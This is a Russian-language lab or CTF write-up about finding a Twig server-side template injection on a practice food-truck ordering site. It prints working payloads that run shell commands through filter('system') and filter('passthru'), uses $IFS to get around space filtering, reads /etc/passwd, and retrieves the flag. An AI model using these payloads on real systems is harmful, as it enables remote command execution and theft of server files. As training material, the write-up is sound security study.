## Сценарий

Компания, занимающаяся фудтраками, Flavor Fusion Express поручила вам провести оценку безопасности своего недавно запущенного веб-сайта, созданного для расширения охвата клиентов и упрощения онлайн-заказов. Несмотря на то, что сайт призван повысить вовлеченность пользователей и узнаваемость бренда, компания особенно обеспокоена потенциальными уязвимостями на стороне сервера, которые могут привести к компрометации конфиденциальных бизнес-данных, информации о заказах или административных функций. Ваша задача — оценить серверную инфраструктуру, конфигурацию и логику сервера на предмет уязвимостей, которыми может воспользоваться злоумышленник. Попробуйте использовать различные методы, о которых вы узнали в этом модуле, чтобы выявить и устранить уязвимости в веб-приложении.


## Решение

Необходимо выявить тип уязвимости.
Им оказался SSTI

<img width="1551" height="418" alt="image" src="https://github.com/user-attachments/assets/3fe432b2-ec70-44f8-874c-f5d7297d5d83" />

Нагрузка дала такой результат: `{{7*'7'}}` = 49, соответственно шаблонизатор - `twig`

Пробуем другие полезные нагрузки для `twig`

`{{"/etc/passwd"|file_excerpt(1,-1)}}` - дало пустой вывод 200 статус

`{{['id'] | filter('system')}}` - выдало  ошибку: 
`Error (3): URL using bad/illegal format or missing URL`

`{{%5B%27id%27%5D+%7C+filter%28%27system%27%29}}` - та же ошибка

Вероятно надо фаззить нагрузку которая сработает.

`{{_self}}` - работает и выводит 

<img width="666" height="92" alt="image" src="https://github.com/user-attachments/assets/30c0a050-cfc1-4aab-b4e0-81d2047c3df8" />

Загрузил все возможные пейлоды для TWIG  и нашел пару рабочих.

<img width="1788" height="175" alt="image" src="https://github.com/user-attachments/assets/f5adb5b1-c501-41df-836a-dd1841f93b40" />


Например такой, наконец выводил `ls`

<img width="1624" height="274" alt="image" src="https://github.com/user-attachments/assets/f1143cc3-82c2-4edc-87c2-1b8e8bf78f2d" />

Но при попытке прочитать директорию выводил ту же ошибку (3).  Пробел через кодирование `%20`, также не проходит. 

Тогда я попробовал другую нагрузку где читался файл `/etc/passwd`, а именно:
`{{['cat$IFS/etc/passwd']|filter('system')}}`

<img width="471" height="373" alt="image" src="https://github.com/user-attachments/assets/7aab3788-7d49-49dc-8fb9-8b4af889aa53" />


Стало ясно, что нужно использовать `$IFS`, поэтому добавил его к своей нагрузке
`{{['ls$IFS/']|filter('passthru')}}` и получил ответ

<img width="350" height="242" alt="image" src="https://github.com/user-attachments/assets/ffb82d35-064a-4311-801e-16e3edfed7a3" />


Результат чтения флага.
<img width="1788" height="194" alt="image" src="https://github.com/user-attachments/assets/6d4aa582-5474-4c66-a877-d6db199cc547" />
